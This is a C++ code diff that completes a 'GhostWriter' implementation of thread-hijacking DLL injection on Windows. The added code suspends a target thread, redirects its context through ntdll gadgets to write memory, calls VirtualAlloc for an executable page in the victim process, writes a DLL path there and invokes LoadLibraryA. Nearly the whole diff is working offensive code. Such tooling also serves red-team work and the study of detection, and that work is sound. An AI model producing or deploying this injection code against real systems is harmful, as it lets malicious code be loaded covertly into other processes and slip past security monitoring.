@@ -55,21 +55,6 @@ bool GhostWriter::ResumeThread()
     return false;
 }
 
-void GhostWriter::SetLoopGadget(BYTE* address)
-{
-    this->loopGadgetAddr = address;
-}
-
-void GhostWriter::SetPushGadget(BYTE* address)
-{
-    this->pushGadgetAddr = address;
-}
-
-void GhostWriter::SetWriteGadget(BYTE* address)
-{
-    this->writeGadgetAddr = address;
-}
-
 void GhostWriter::GetContext(void* context)
 {
     bool success = false;
@@ -124,9 +109,28 @@ void GhostWriter::WriteBytes(BYTE* buffer, size_t bufferSize, uintptr_t where)
 
     for (unsigned int i = 0; i < bufferSize; i += ptrSize)
     {
-        uintptr_t what = reinterpret_cast<uintptr_t>(buffer + i);
+        uintptr_t what = *reinterpret_cast<uintptr_t*>(buffer + i);
         this->CallWriteGadget(what, where + i);
         this->WaitForLoop();
+    }
+}
+
+void GhostWriter::CallFunctionAt(BYTE* address)
+{
+    if (this->loopGadgetPtrAddr)
+    {
+        ThreadContext context = ThreadContext(this->is32Bits);
+
+        this->SuspendThread();
+        this->GetContext(context.GetContextPtr());
+        context.SetRsp(reinterpret_cast<uintptr_t>(this->loopGadgetPtrAddr));
+        context.SetRip(reinterpret_cast<uintptr_t>(address));
+        this->SetContext(context.GetContextPtr());
+        this->ResumeThread();
+    }
+    else
+    {
+        std::cerr << "Loop gadget pointer address is null! Call push gadget or set it first." << std::endl;
     }
 }
 
@@ -151,9 +155,11 @@ void GhostWriter::WaitForLoop()
 void GhostWriter::CallPushGadget()
 {
     ThreadContext context = ThreadContext(this->is32Bits);
+    unsigned int ptrSize = this->is32Bits ? 4 : 8;
 
     this->SuspendThread();
     this->GetContext(context.GetContextPtr());
+    this->loopGadgetPtrAddr = reinterpret_cast<BYTE*>(context.GetRsp() - ptrSize);
     context.SetRdi(reinterpret_cast<uintptr_t>(this->loopGadgetAddr));
     context.SetRip(reinterpret_cast<uintptr_t>(this->pushGadgetAddr));
     this->SetContext(context.GetContextPtr());
@@ -162,21 +168,84 @@ void GhostWriter::CallPushGadget()
 
 void GhostWriter::CallWriteGadget(uintptr_t what, uintptr_t where)
 {
-    ThreadContext context = ThreadContext(this->is32Bits);
+    if (this->loopGadgetPtrAddr)
+    {
+        ThreadContext context = ThreadContext(this->is32Bits);
 
-    this->SuspendThread();
-    this->GetContext(context.GetContextPtr());
-    context.SetRdx(what);
-    context.SetRcx(where);
-    context.SetRip(reinterpret_cast<uintptr_t>(this->writeGadgetAddr));
-    this->SetContext(context.GetContextPtr());
-    this->ResumeThread();
+        this->SuspendThread();
+        this->GetContext(context.GetContextPtr());
+        context.SetRdx(what);
+        context.SetRcx(where);
+        context.SetRsp(reinterpret_cast<uintptr_t>(this->loopGadgetPtrAddr));
+        context.SetRip(reinterpret_cast<uintptr_t>(this->writeGadgetAddr));
+        this->SetContext(context.GetContextPtr());
+        this->ResumeThread();
+    }
+    else
+    {
+        std::cerr << "Loop gadget pointer address is null! Call push gadget or set it first." << std::endl;
+    }
 }
 
 // ***********************************
 
 namespace
 {
+    uintptr_t CallVirtualAlloc(GhostWriter& ghostWriter, uintptr_t virtualAllocAddr)
+    {
+        ThreadContext context = ThreadContext(ghostWriter.is32Bits);
+        
+        if (ghostWriter.is32Bits)
+        {
+            ghostWriter.CallWriteGadget(0, reinterpret_cast<uintptr_t>(ghostWriter.loopGadgetPtrAddr + 4)); // nullptr
+            ghostWriter.WaitForLoop();
+            ghostWriter.CallWriteGadget(0x1000, reinterpret_cast<uintptr_t>(ghostWriter.loopGadgetPtrAddr + 8)); // size
+            ghostWriter.WaitForLoop();
+            ghostWriter.CallWriteGadget(0x3000, reinterpret_cast<uintptr_t>(ghostWriter.loopGadgetPtrAddr + 12)); // MEM_COMMIT | MEM_RESERVE
+            ghostWriter.WaitForLoop();
+            ghostWriter.CallWriteGadget(0x40, reinterpret_cast<uintptr_t>(ghostWriter.loopGadgetPtrAddr + 16)); // PAGE_EXECUTE_READWRITE
+            ghostWriter.WaitForLoop();
+        }
+        else
+        {
+            ghostWriter.GetContext(context.GetContextPtr());
+            context.SetRcx(0); // nullptr
+            context.SetRdx(0x1000); // size
+            context.SetR8(0x3000); // MEM_COMMIT | MEM_RESERVE
+            context.SetR9(0x40); // PAGE_EXECUTE_READWRITE
+            ghostWriter.SetContext(context.GetContextPtr());
+        }
+        // call function
+        ghostWriter.CallFunctionAt(reinterpret_cast<BYTE*>(virtualAllocAddr));
+        ghostWriter.WaitForLoop();
+
+        // get allocated memory address
+        ghostWriter.GetContext(context.GetContextPtr());
+        return context.GetRax();
+    }
+
+    void CallLoadLibraryA(GhostWriter& ghostWriter, uintptr_t loadLibraryAAddr, uintptr_t dllPathAddr)
+    {
+        ThreadContext context = ThreadContext(ghostWriter.is32Bits);
+
+        if (ghostWriter.is32Bits)
+        {
+            // set dllPath argument
+            ghostWriter.CallWriteGadget(dllPathAddr, reinterpret_cast<uintptr_t>(ghostWriter.loopGadgetPtrAddr + 4));
+            ghostWriter.WaitForLoop();
+        }
+        else
+        {
+            // set dllPath argument
+            ghostWriter.GetContext(context.GetContextPtr());
+            context.SetRcx(dllPathAddr);
+            ghostWriter.SetContext(context.GetContextPtr());
+        }
+        // call function
+        ghostWriter.CallFunctionAt(reinterpret_cast<BYTE*>(loadLibraryAAddr));
+        ghostWriter.WaitForLoop();
+    }
+
     BYTE* FindLoopGadget(Process& proc)
     {
         MODULEENTRY32 meNtdll = proc.GetModule("ntdll.dll");
@@ -231,6 +300,7 @@ namespace
     }
 }
 
+// TODO: restore original context
 bool GhostWritingInjection(DWORD threadID, PE& dll)
 {
     bool success = false;
@@ -239,9 +309,17 @@ bool GhostWritingInjection(DWORD threadID, PE& dll)
 
     if (proc.Open(PROCESS_QUERY_LIMITED_INFORMATION))
     {
-        unsigned int contextSize = max(sizeof(CONTEXT), sizeof(WOW64_CONTEXT));
-        auto originalContext = std::make_unique<BYTE[]>(contextSize);
-        auto context = std::make_unique<BYTE[]>(contextSize);
+        ThreadContext originalContext = ThreadContext(proc.is32Bits);
+        ThreadContext context = ThreadContext(ghostWriter.is32Bits);
+        unsigned int ptrSize = ghostWriter.is32Bits ? 4 : 8;
+
+        // get function addresses
+        MODULEENTRY32 meKernel32 = proc.GetModule("kernel32.dll");
+        PE peKernel32 = PE(meKernel32.szExePath);
+        uintptr_t loadLibraryAAddr = reinterpret_cast<uintptr_t>(meKernel32.modBaseAddr) + peKernel32.GetExportRVA("LoadLibraryA");
+        uintptr_t virtualAllocAddr = reinterpret_cast<uintptr_t>(meKernel32.modBaseAddr) + peKernel32.GetExportRVA("VirtualAlloc");
+        std::cout << "LoadLibraryA at 0x" << loadLibraryAAddr << "\n";
+        std::cout << "VirtualAlloc at 0x" << virtualAllocAddr << "\n\n";
 
         // find gadgets
         BYTE* loopGadgetAddr = FindLoopGadget(proc);
@@ -251,17 +329,44 @@ bool GhostWritingInjection(DWORD threadID, PE& dll)
         std::cout << std::hex;
         std::cout << "Loop gadget address: 0x" << (uintptr_t)loopGadgetAddr << "\n";
         std::cout << "Push gadget address: 0x" << (uintptr_t)pushGadgetAddr << "\n";
-        std::cout << "Write gadget address: 0x" << (uintptr_t)writeGadgetAddr << "\n";
+        std::cout << "Write gadget address: 0x" << (uintptr_t)writeGadgetAddr << "\n\n";
 
-        ghostWriter.SetLoopGadget(loopGadgetAddr);
-        ghostWriter.SetPushGadget(pushGadgetAddr);
-        ghostWriter.SetWriteGadget(writeGadgetAddr);
+        ghostWriter.loopGadgetAddr = loopGadgetAddr;
+        ghostWriter.pushGadgetAddr = pushGadgetAddr;
+        ghostWriter.writeGadgetAddr = writeGadgetAddr;
 
         std::cout << "Calling push gadget...\n";
         ghostWriter.CallPushGadget();
         std::cout << "Waiting for loop...\n";
         ghostWriter.WaitForLoop();
-        std::cout << "Thread is looping!\n";
+        std::cout << "Thread is looping!\n\n";
+
+        // rebase stack so we don't overwrite the original stack. -----
+        std::cout << "Rebasing stack...\n";
+        ghostWriter.GetContext(context.GetContextPtr());
+        uintptr_t baseStackAddress = context.GetRsp() - 0x100;
+
+        // set new loopGadgetPtrAddr
+        ghostWriter.CallWriteGadget(reinterpret_cast<uintptr_t>(ghostWriter.loopGadgetAddr), baseStackAddress);
+        ghostWriter.WaitForLoop();
+        ghostWriter.loopGadgetPtrAddr = reinterpret_cast<BYTE*>(baseStackAddress);
+        std::cout << "Stack rebased!\n\n";
+
+        // inject dll -----
+        std::cout << "Calling VirtualAlloc...\n";
+        uintptr_t memoryPageAddr = CallVirtualAlloc(ghostWriter, virtualAllocAddr);
+        std::cout << "Memory page at 0x" << memoryPageAddr << std::endl;
+
+        // write dll path
+        std::cout << "Writing dll path in the newly allocated memory...\n";
+        ghostWriter.WriteBytes(reinterpret_cast<BYTE*>(dll.filePath), strnlen(dll.filePath, MAX_PATH) + 1, memoryPageAddr);
+        ghostWriter.WaitForLoop();
+
+        std::cout << "Calling LoadLibraryA...\n";
+        CallLoadLibraryA(ghostWriter, loadLibraryAAddr, memoryPageAddr);
+        std::cout << "Done!" << std::endl;
+
+        proc.Close();
     }
     else
     {
